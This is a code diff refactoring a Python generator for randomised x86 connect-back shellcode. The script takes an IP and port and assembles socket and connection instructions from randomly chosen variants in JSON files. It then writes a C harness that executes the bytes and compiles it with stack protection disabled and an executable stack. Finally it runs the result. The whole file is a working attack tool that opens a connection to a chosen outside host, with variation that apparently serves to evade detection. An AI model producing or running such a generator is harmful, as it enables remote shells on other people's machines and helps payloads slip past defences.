@@ -6,69 +6,81 @@ import subprocess
 
 init(autoreset=True)
 
-shellcode = ""
+def validate_args():
+    if len(sys.argv) != 3:
+        print(Fore.RED + "Invalid parameters. Use: python generator.py <IP> <PORT>")
+        exit(1)
+    return sys.argv[1], sys.argv[2]
 
-if len(sys.argv) != 3:
-    print(Fore.RED + "Invalid parameters. Use: python generator.py <IP> <PORT>")
-    exit(1)
-else:
-    ipv4 = sys.argv[1]
-    port = sys.argv[2]
-
-def ip_to_hex(ip):
-    if not all(1 <= int(byte) <= 255 for byte in ip.split('.')):
+def ip2hex(ip):
+    try:
+        hex_parts = (format(int(byte), '02X') for byte in ip.split('.'))
+        return ''.join(hex_parts)
+    except ValueError:
         print(Fore.RED + "Invalid IP.")
         exit(1)
-    hex_parts = (format(int(byte), 'X').zfill(2) for byte in ip.split('.'))
-    return ''.join(hex_parts)
 
-def port_to_hex(port):
-    port_hex = format(int(port), '04X')
-    return port_hex
+def port2hex(port):
+    try:
+        return format(int(port), '04X')
+    except ValueError:
+        print(Fore.RED + "Invalid Port.")
+        exit(1)
 
 def format_shellcode(s):
-    formatted_shellcode = '\\x'.join(s[i:i+2] for i in range(0, len(s), 2))
-    return formatted_shellcode
+    return ''.join(f'\\x{a}{b}' for a, b in zip(s[::2], s[1::2]))
 
-ipv4_hex = ip_to_hex(ipv4)
-port_hex = port_to_hex(port)
+def load_json(file):
+    with open(file, 'r') as f:
+        return json.load(f)
 
-with open('socket_creation_steps.json', 'r') as f:
-    socket_creation_steps = json.load(f)
+def generate_shellcode(ip_hex, port_hex):
+    shellcode = ""
+    socket_steps = load_json('socket_creation_steps.json')
+    for step, options in socket_steps.items():
+        shellcode += random.choice(options)
 
-for step, options in socket_creation_steps.items():
-    shellcode += random.choice(options)
+    connection_steps = load_json('connection_steps.json')
+    connection_steps["connection_socket_5"] = ["68" + ip_hex]  # push IP
+    connection_steps["connection_socket_6"] = ["6668" + port_hex]  # push port
 
-with open('connection_steps.json', 'r') as f:
-    connection_steps = json.load(f)
+    for step, options in connection_steps.items():
+        shellcode += random.choice(options)
+    
+    return shellcode
 
-connection_steps["connection_socket_5"] = ["68" + ipv4_hex]  # push IP
-connection_steps["connection_socket_6"] = ["6668" + port_hex]  # push port
-
-for step, options in connection_steps.items():
-    shellcode += random.choice(options)
-
-formatted_shellcode = format_shellcode(shellcode)
-print(Fore.CYAN + "Shellcode size: " + Fore.WHITE + str(len(shellcode)) + " bytes")
-print("\n")
-print(Fore.GREEN + "Generated Shellcode: \n")
-print(Fore.YELLOW + formatted_shellcode + "\n")
-
-c_program = f'''
+def create_c_program(shellcode):
+    return f'''
 #include <stdio.h>
 #include <string.h>
 
 int main(void) {{
-    char code[] = "{formatted_shellcode}";
+    char code[] = "{shellcode}";
     int (*ret)() = (int(*)())code;
     ret();
 }}
 '''
 
-with open('shellcode.c', 'w') as f:
-    f.write(c_program)
+def compile_and_run():
+    compile_command = ['gcc', 'shellcode.c', '-w', '-fno-stack-protector', '-z', 'execstack', '-no-pie', '-o', 'shellcode.bin']
+    subprocess.run(compile_command)
+    subprocess.run(['./shellcode.bin'])
 
-compile_command = ['gcc', 'shellcode.c', '-w', '-fno-stack-protector', '-z', 'execstack', '-no-pie', '-o', 'shellcode.bin']
-subprocess.run(compile_command)
+def main():
+    ipv4, port = validate_args()
+    ipv4_hex = ip2hex(ipv4)
+    port_hex = port2hex(port)
+    shellcode = generate_shellcode(ipv4_hex, port_hex)
+    formatted_shellcode = format_shellcode(shellcode)
+    
+    print(Fore.CYAN + "Shellcode size: " + Fore.WHITE + str(len(shellcode)) + " bytes")
+    print("\n" + Fore.GREEN + "Generated Shellcode: \n" + Fore.YELLOW + formatted_shellcode + "\n")
+    
+    c_program = create_c_program(formatted_shellcode)
+    with open('shellcode.c', 'w') as f:
+        f.write(c_program)
 
-subprocess.run(['./shellcode.bin'])
+    compile_and_run()
+
+if __name__ == "__main__":
+    main()
